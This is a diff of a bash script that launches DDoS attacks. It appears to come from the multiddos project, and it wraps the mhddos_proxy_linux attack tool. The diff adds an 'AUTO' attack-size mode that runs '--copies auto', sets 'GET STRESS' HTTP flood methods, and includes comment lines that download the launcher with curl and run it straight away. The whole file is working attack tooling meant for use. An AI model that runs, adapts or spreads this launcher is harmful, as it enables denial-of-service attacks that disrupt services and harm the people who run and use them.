@@ -1,7 +1,7 @@
 #!/bin/bash
 # curl -LO tiny.one/multiddos && bash multiddos
 # curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh && bash md2.sh
-clear && echo -e "Loading... v1.21e\n"
+clear && echo -e "Loading... v1.21f\n"
 sudo apt-get update -q -y #>/dev/null 2>&1
 sudo apt-get install -q -y tmux jq git toilet python3 python3-pip 
 pip install --upgrade pip >/dev/null 2>&1
@@ -14,7 +14,7 @@ db1000n="off"
 vnstat="off"
 proxy_finder="off"
 export methods="--http-methods GET STRESS"
-export ddos_size="L"
+export ddos_size="AUTO"
 
 # create swap file if system doesn't have it. Helps systems with very little RAM.
 if [[ $(echo $(swapon --noheadings --bytes | cut -d " " -f3)) == "" ]]; then
@@ -142,7 +142,9 @@ cat > auto_bash.sh << 'EOF'
 if [[ $mhddos_mode == "new" ]]; then
     cd ~/multidd/
 
-    if [[ $ddos_size == "XS" ]]; then
+    if [[ $ddos_size == "AUTO" ]]; then
+        ./mhddos_proxy_linux --copies auto $args_to_pass
+    elif [[ $ddos_size == "XS" ]]; then
         ./mhddos_proxy_linux -t 1000 $args_to_pass
     elif [[ $ddos_size == "S" ]]; then
         ./mhddos_proxy_linux -t 2000 $args_to_pass
